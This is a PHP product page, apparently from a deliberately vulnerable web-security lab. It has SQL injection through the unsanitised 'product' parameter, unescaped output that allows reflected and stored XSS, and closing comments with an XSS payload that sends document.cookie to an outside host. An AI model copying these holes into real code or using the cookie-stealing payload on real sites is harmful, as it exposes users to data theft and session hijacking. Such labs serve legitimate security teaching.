<?php
include("config.php");
include("header.php");
//phpinfo();
$product = $_GET["product"];

$q = "SELECT * FROM product WHERE id = $product";

$r = mysql_query($q);
?>
<div>

<b>Showing Details about Product <?= $product ?></b>

<?php

if (mysql_num_rows($r) == 0) {
	echo "<br /><br />No Product Found";
} else {
	while ($row = mysql_fetch_array($r)) {

		?>
		<div id="produc-<?= $row["id"] ?>" class="product">
			<div class="title">
				<h3><?= $row["name"] ?></h3>
			</div>
			<div class="image">
				<img src="/images/<?= $row["picurl"] ?>" />
			</div>
			<div class="price">
				Price: <?= $row["price"] ?>
			</div>
		</div>
		<?php

	}


	//Add Comments form
	//Todo Fatch Comments

	$q = "SELECT * FROM product_comment WHERE id = $product";
	$r = mysql_query($q);

	if (mysql_num_rows($r) == 0) {
	echo "<br /><br />No Comments to show";
	} else {
		while ($row = mysql_fetch_array($r)) {

			?>
			<div id="comment-<?= $row["id"] ?>" class="product">
				<div class="title">
					<h3><?= $row["email"] ?></h3>
				</div>
				<div class="image">
					<p><?= $row["comment"] ?></p>
				</div>
			</div>
			<?php

		}


		//Add Comments form
		//Todo Fatch Comments

		$q = "SELECT * FROM product_comment WHERE id = $product";
		$r = mysql_query($q);

	}

}
?>

</div>

<?php 
	include("footer.php"); 
?>

<!-- Chrome has AntiXSS filter so cool - http://blog.securitee.org/?p=37 -->
<!-- Steal cookies using XSS -->
<!-- http://amazon.two/product.php?product=%3Cscript%3Enew%20Image%28%29.src=%22http://google.com%22%3C/script%3E-->
<!-- http://amazon.two/product.php?product=<script>new Image().src="http://good.site/attacks/showimage.php?param="+document.cookie</script> -->